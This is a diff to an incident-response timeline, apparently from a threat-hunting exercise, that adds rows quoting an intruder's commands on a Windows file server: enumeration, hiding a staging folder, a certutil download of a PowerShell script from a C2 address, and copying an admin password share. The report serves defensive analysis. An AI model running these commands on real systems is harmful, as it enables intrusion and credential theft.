@@ -291,13 +291,13 @@ A forward-looking strategy will involve more granular network access controls an
 | `2025-11-19T19:10:49.2662627Z` | Unauthorized access to the administrator account `fileadmin` was identified with an unknown LogonType. |
 | `2025-11-22T00:40:54.8271951Z` | `"net.exe" share` command was executed in order to enumerate local network shares. Initial attempts at discovery began at this timeframe. |
 | `2025-11-22T00:42:01.9579347Z` | `"net.exe" view \\10.1.0.188` command was executed to enumerate remote shares. |
-| `2025-11-22T00:42:24.1217046Z` | Privilege enumeration techniques were implemented with a Windows native utility using the executable command `"whoami.exe" /all`. |
-| `2025-11-22T00:42:46.3655894Z` | Network configuration enumeration using a Windows native utility were executed using `"ipconfig.exe" /all`. |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
-|                |                                                                                                                                    |
+| `2025-11-22T00:42:24.1217046Z` | Privilege enumeration techniques were implemented with a Windows native utility using the executable command: `"whoami.exe" /all`. |
+| `2025-11-22T00:42:46.3655894Z` | Network configuration enumeration using a Windows native utility were executed using: `"ipconfig.exe" /all`. |
+| `2025-11-22T00:55:43.9986049Z` | `"attrib.exe" +h +s C:\Windows\Logs\CBS` was executed in order to hide the staging directory. |
+| `2025-11-22T00:55:43.9986049Z` | The staging directory path `C:\Windows\Logs\CBS` was created to organize tools and data for exfiltration. This directory path is critical for IoC. |
+| `2025-11-22T00:56:47.4100711Z` | A PowerShell script was downloaded using a Windows binary. `*"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` was executed to download the malicious script from the C2 server. |
+| `2025-11-22T01:07:53.6746323Z` | The file `IT-Admin-Passwords.csv` was created within the staging directory and indicated intent to harvest credentials by using a self-explanatory naming convention. |
+| `2025-11-22T01:07:53.6430063Z` | Using a built-in system utility, the attacker replicated a network share's contents while preserving attributes and subdirectories using the command: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. |
 |                |                                                                                                                                    |
 |                |                                                                                                                                    |
 |                |                                                                                                                                    |
